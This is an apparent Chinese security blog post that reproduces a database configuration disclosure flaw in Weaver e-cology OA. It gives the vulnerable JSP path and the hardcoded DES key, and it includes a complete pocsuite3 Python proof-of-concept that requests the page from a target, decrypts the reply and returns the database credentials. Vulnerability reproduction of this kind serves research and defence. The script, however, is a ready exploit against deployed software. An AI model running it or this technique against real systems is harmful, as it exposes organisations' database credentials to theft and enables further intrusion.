---
title:  泛微ecology OA数据库配置信息泄露漏洞复现
date: 2019-10-28 09:31:52
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - 泛微e-cology OA
    - 漏洞复现
    - info_disclosure
---
# 0x00 漏洞概述

泛微ecology OA系统接口存在数据库配置信息泄露漏洞,
攻击者可通过该漏洞页面直接获取到数据库配置信息，
攻击者可通过访问存在漏洞的页面并解密从而获取数据库配置信息

# 0x01 影响版本

**漏洞涉及范围包括不限于8.0、9.0版**

# 0x02 漏洞复现
## 环境搭建

附上 **ecology8.1安装包+安装教程**
百度链接：[https://pan.baidu.com/s/1ciU0clOlqV3iDqQ6Ic2RAA](https://pan.baidu.com/s/1ciU0clOlqV3iDqQ6Ic2RAA)
提取码: 3xh9 

## 漏洞利用

直接访问存在漏洞路径，
结果为DES加密以后的乱码

`url+/mobile/DBconfigReader.jsp`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104142320.png)


查看返回的数据，发现存在一些`\r\n`，需要去掉`\r\n`，
可以选择切片取出数据，也可以使用repalce替换
再使用DES算法结合密钥进行解密之后，
即可获得数据库相关信息，密钥为`1z2x3c4v`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191104142755.png)

## POC

```
#! python3
"""

@FileName: e_cology_oa_info_disclosure.py.py
@Author: dylan
@software: PyCharm 
@Datetime: 2019-10-28 10:30

"""
import base64
import urllib.parse
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pyDes import *


class DemoPOC(POCBase):
    vulID = ""  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "3.0"  # 默认为1
    author = "dylan"  # PoC作者的大名
    vulDate = "2019/10/29"  # 漏洞公开的时间,不知道就写今天
    createDate = "2019/10/29"  # 编写 PoC 的日期
    updateDate = "2019/10/29"  # PoC 更新的时间,默认和编写时间一样
    references = [""]  # 漏洞地址来源,0day不用写
    name = "e_cology_oa_info_disclosure"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "e_cology_oa"  # 漏洞应用名称
    appVersion = ""  # 漏洞影响版本
    vulType = "info_disclosure"  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = """
        
    """  # 漏洞简要描述
    samples = [""]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = """
    
    """

    def _verify(self):
        # 验证代码
        result = {}
        headers = {
            'User-Agent': "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; "
                          ".NET CLR 2.0.50727)",
        }
        path = self.url + "/mobile/DBconfigReader.jsp"
        respose = requests.get(path, headers=headers, verify=False, timeout=30).content.replace(b'\r\n', b'')
        # print(respose)
        respose = str(des('1z2x3c4v').decrypt(respose))
        # print(respose)
        if "user" in respose:  # result是返回结果
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = path
            result['DBInfo'] = respose
        return self.parse_output(result)

    def _attack(self):
        # 攻击代码
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("Internet nothing returned")
        return output


# 注册 DemoPOC 类
register_poc(DemoPOC)
```

# 参考文章

[泛微 e-cology OA 数据库配置信息泄露漏洞复现](https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247483918&idx=1&sn=9319c04f7d7dad68f224b24ceb46e05e)
[DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞](https://github.com/jas502n/DBconfigReader)